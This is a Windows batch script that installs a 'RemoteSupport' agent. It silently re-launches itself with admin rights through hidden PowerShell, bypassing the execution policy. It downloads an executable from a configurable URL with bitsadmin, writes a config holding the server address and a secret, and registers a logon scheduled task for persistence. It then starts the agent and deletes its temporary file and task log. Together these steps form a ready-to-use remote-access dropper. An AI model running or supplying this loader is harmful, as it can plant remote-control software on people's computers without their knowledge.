@echo off
setlocal EnableExtensions EnableDelayedExpansion

set "SERVER=%SERVER%"
set "DEVICE_ID=%DEVICE_ID%"
set "SECRET=%SECRET%"
set "AGENT_URL=%AGENT_URL%"
set "DIR=%ProgramData%\RemoteSupport"
set "EXE=%ProgramData%\RemoteSupport\RemoteSupportAgent.exe"
set "TMP=%TEMP%\RemoteSupportAgent-%RANDOM%-%RANDOM%.download"
set "CFG=%ProgramData%\RemoteSupport\agent.json"
set "TASK=RemoteSupport Agent"
set "BITS_JOB=RemoteSupportAgent-%RANDOM%-%RANDOM%"
set "TASK_LOG=%TEMP%\RemoteSupportAgent-task-%RANDOM%.log"

rem Proven V36 BAT startup/elevation pattern.
fltmc >nul 2>&1
if errorlevel 1 (
  powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Start-Process -FilePath '%ComSpec%' -ArgumentList '/c ""%~f0""' -Verb RunAs -WindowStyle Hidden" >nul 2>&1
  if errorlevel 1 exit /b 1
  exit /b 0
)

where bitsadmin.exe >nul 2>&1
if errorlevel 1 exit /b 1
if not exist "%DIR%" mkdir "%DIR%"
if errorlevel 1 exit /b 1

taskkill /IM RemoteSupportAgent.exe /F >nul 2>&1
taskkill /IM WindowsSupport.exe /F >nul 2>&1
if exist "%TMP%" del /q "%TMP%" >nul 2>&1

echo Downloading...
bitsadmin.exe /transfer "%BITS_JOB%" /download /priority FOREGROUND "%AGENT_URL%" "%TMP%" >nul 2>&1
set "BITS_RC=!errorlevel!"
if not "!BITS_RC!"=="0" (
  if exist "%TMP%" del /q "%TMP%" >nul 2>&1
  powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "$ErrorActionPreference='Stop'; Start-BitsTransfer -Source '%AGENT_URL%' -Destination '%TMP%' -Priority Foreground -RetryInterval 5 -RetryTimeout 120" >nul 2>&1
  set "BITS_PS_RC=!errorlevel!"
  if not "!BITS_PS_RC!"=="0" exit /b 1
)
if not exist "%TMP%" exit /b 1

set "SIZE="
for %%A in ("%TMP%") do set "SIZE=%%~zA"
if not defined SIZE exit /b 1
if !SIZE! LSS 1000000 exit /b 1
copy /Y "%TMP%" "%EXE%" >nul
if errorlevel 1 exit /b 1
if not exist "%EXE%" exit /b 1

>"%CFG%" echo {"server":"%SERVER%","deviceId":"%DEVICE_ID%","secret":"%SECRET%"}
if errorlevel 1 exit /b 1

rem EXACT proven V7/V8 startup mechanism.
schtasks /Delete /TN "%TASK%" /F >nul 2>&1
schtasks /Create /TN "%TASK%" /SC ONLOGON /TR "\"%EXE%\"" /RU "%USERNAME%" /RL LIMITED /F >"%TASK_LOG%" 2>&1
if errorlevel 1 exit /b 1
schtasks /Query /TN "%TASK%" >nul 2>&1
if errorlevel 1 exit /b 1

start "Remote Support Agent" "%EXE%" >nul 2>&1
timeout /t 3 /nobreak >nul 2>&1
tasklist /FI "IMAGENAME eq RemoteSupportAgent.exe" 2>nul | find /I "RemoteSupportAgent.exe" >nul
if errorlevel 1 exit /b 1

if exist "%TMP%" del /q "%TMP%" >nul 2>&1
if exist "%TASK_LOG%" del /q "%TASK_LOG%" >nul 2>&1
exit /b 0
